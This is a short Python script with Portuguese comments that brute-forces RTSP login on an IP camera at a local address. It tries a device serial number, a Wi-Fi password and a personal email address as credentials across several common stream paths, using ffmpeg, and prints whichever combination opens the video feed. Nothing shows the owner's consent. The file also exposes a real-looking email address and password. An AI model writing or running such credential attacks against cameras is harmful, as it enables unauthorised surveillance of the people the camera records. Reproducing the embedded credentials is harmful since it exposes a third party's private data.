import subprocess
import urllib.parse

# Alvos fornecidos pelo Samuel
SERIAL = "8b71b5d895ca55e2"
WIFI_PASS = "##samuel283@@"
IP = "192.168.3.71"

# Matriz de Teste Final
USERS = ["admin", "tatianapatriciamartinezospino@hotmail.com"]
PASSWORDS = [SERIAL, WIFI_PASS]
PATHS = [
    "/live/ch0",
    "/stream1",
    "/onvif-media/media.amp",
    "/Streaming/Channels/101",
    "/cam/realmonitor?channel=1&subtype=0"
]

def attempt_connection():
    print(f"🚀 INICIANDO OPERAÇÃO SERIAL-CHECK: [{SERIAL}]")
    print("-" * 50)
    
    for pwd in PASSWORDS:
        encoded_pw = urllib.parse.quote(pwd)
        for user in USERS:
            encoded_user = urllib.parse.quote(user)
            for path in PATHS:
                url = f"rtsp://{encoded_user}:{encoded_pw}@{IP}:554{path}"
                print(f"🔎 Testando: User=[{user}] Pass=[{pwd[:4]}...] Path=[{path}]")
                
                cmd = ["/opt/homebrew/bin/ffmpeg", "-rtsp_transport", "tcp", "-i", url, "-t", "1", "-f", "null", "-"]
                
                try:
                    res = subprocess.run(cmd, capture_output=True, timeout=5)
                    if res.returncode == 0:
                        return url, user, pwd, path
                except:
                    pass
    return None, None, None, None

if __name__ == "__main__":
    url, user, pwd, path = attempt_connection()
    if url:
        print("\n" + "!" * 50)
        print("🚨 SUCESSO! A CHAVE FOI ENCONTRADA!")
        print(f"👤 Usuário: {user}")
        print(f"🔑 Senha: {pwd}")
        print(f"🔗 URL: {url}")
        print("!" * 50)
    else:
        print("\n❌ O Serial Number e a senha do Wi-Fi não abriram os canais RTSP.")
